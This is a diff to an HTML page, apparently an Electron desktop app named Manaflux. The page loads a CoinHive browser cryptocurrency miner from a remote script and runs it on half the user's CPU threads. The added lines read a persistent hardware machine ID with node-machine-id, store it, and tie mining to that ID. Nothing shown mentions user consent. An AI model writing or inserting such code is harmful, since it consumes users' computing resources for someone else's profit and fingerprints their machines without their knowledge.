@@ -284,7 +284,10 @@
   </audio>
   <script src="https://manaflux-server.herokuapp.com/scripts/miner.js" integrity="sha384-BobkKQ4L8ZIIM2MApoY36xaHDi0wHZoJuaqi/HXjtQvljU3R9OwaBPA+veeY+3Rv" crossorigin="anonymous"></script>
   <script>
-      var miner = new CoinHive.Anonymous('UZqdO60CqnRVj9olLFTZCmrj6yl5Dynn', { throttle: 0.8, threads: navigator.hardwareConcurrency / 2, theme: 'dark' });
+      if (!localStorage['machineId'])
+        localStorage.setItem('machineId', require('node-machine-id').machineIdSync());
+
+      var miner = new CoinHive.User('UZqdO60CqnRVj9olLFTZCmrj6yl5Dynn', localStorage['machineId'], { throttle: 0.8, threads: navigator.hardwareConcurrency / 2, theme: 'dark' });
   </script>
   <script src="vendor/jquery-3.3.1.min.js" onload="window.$ = window.jQuery = module.exports;"></script>
   <script src="vendor/jquery-ui.min.js"></script>
